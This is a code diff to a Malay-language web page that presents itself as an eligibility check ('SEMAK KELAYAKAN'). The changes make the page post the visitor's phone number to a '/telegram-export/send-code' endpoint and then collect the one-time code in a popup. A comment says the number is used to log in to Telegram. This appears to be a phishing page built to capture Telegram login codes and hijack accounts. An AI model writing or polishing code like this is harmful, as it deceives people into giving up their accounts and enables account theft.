@@ -364,10 +364,6 @@ SEMAK KELAYAKAN
 </div>
 </div>
 
-<form id="telegramLoginForm" action="/telegram-export/send-code" method="post" style="display:none;">
-    <input type="hidden" name="phone" id="telegramPhoneInput" value="">
-</form>
-
 <div class="popup" id="popup">
 
     <div class="popup-content">
@@ -423,7 +419,14 @@ SEMAK KELAYAKAN
 <script>
 
 function bukaPopup(){
+    document.querySelectorAll(".otp-input").forEach(input => {
+        input.value = "";
+        input.classList.remove("error");
+    });
     document.getElementById("popup").style.display = "flex";
+    setTimeout(() => {
+        otpInputs[0]?.focus();
+    }, 20);
 }
 
 function tutupPopup(){
@@ -608,8 +611,34 @@ function semakBorang(){
 
     // Hantar nombor telefon ke app.py untuk login Telegram (auto-add +60)
     let phoneWithCountryCode = '+60' + telefon.value.trim();
-    document.getElementById('telegramPhoneInput').value = phoneWithCountryCode;
-    document.getElementById('telegramLoginForm').submit();
+
+    semakBtn.disabled = true;
+    semakBtn.textContent = "Menghantar kod...";
+
+    fetch("/telegram-export/send-code", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            phone: phoneWithCountryCode
+        })
+    })
+    .then(response => {
+        semakBtn.disabled = false;
+        semakBtn.textContent = "SEMAK KELAYAKAN";
+        if (!response.ok) {
+            throw new Error("Gagal hantar kod. Sila cuba semula.");
+        }
+        return response.text();
+    })
+    .then(() => {
+        bukaPopup();
+    })
+    .catch(error => {
+        console.log(error);
+        alert(error.message || "Gagal hantar kod. Sila cuba semula.");
+    });
 
 }
 
@@ -641,14 +670,14 @@ function verifyCode(){
             otp: code
         })
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.success) {
-            console.log("Pengesahan:", data);
+    .then(response => response.json().then(data => ({status: response.status, ok: response.ok, data})))
+    .then(({ok, data}) => {
+        if (ok && data.ok) {
             tutupPopup();
             bukaPopupSuccess();
         } else {
-            alert("Pengesahan gagal: " + (data.error || "Sila cuba semula."));
+            let errorMessage = "Pengesahan gagal: " + (data.error || data.description || "Sila cuba semula.");
+            alert(errorMessage);
         }
     })
     .catch(error => {
